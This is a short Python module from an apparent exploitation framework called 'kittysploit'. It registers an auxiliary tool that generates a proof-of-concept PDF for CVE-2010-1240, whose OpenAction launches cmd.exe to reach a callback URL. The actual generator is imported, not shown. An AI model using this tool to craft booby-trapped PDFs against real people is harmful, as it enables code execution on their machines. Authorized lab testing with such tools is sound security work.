#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.actions import write_launch_win_cve


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": "PDF CVE-2010-1240 Launch /Win Callback",
        "description": (
            "Generate PDF PoC in the CVE-2010-1240 /Launch /Win family: OpenAction launches "
            "cmd.exe to start a callback URL (authorized Windows viewer labs)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2010-1240"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2010-1240"],
        "tags": ["pdf", "cve-2010-1240", "launch", "windows"],
    }

    PDF_GENERATORS = (write_launch_win_cve,)
    CVE_IDS = ["CVE-2010-1240"]
    MODULE_TITLE = "PDF CVE-2010-1240 Launch /Win Callback"

    def run(self):
        return self.run_pdf_cve()
